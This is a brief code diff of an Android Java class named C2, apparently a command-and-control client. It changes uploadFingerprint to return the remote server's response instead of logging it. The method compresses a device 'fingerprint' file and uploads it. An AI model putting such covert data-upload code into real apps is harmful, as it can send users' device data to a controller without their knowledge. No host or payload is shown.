@@ -19,7 +19,7 @@ public class C2 {
         this.context = context;
     }
 
-    public void uploadFingerprint(){
+    public String uploadFingerprint(){
         //First compress then send
         AndroidFrameworkFileIO io = new AndroidFrameworkFileIO(context);
 
@@ -31,11 +31,11 @@ public class C2 {
 
         FileTransfer ft = new FileTransfer(context);
         try {
-            String response = ft.upload(output);
-            Log.d(TAG, "C2 responded with " + response);
+            return ft.upload(output);
         } catch (FileTransferException e) {
             Log.e(TAG, e.getMessage());
         }
+        return null;
     }
 
     private String makeZipName(File file){
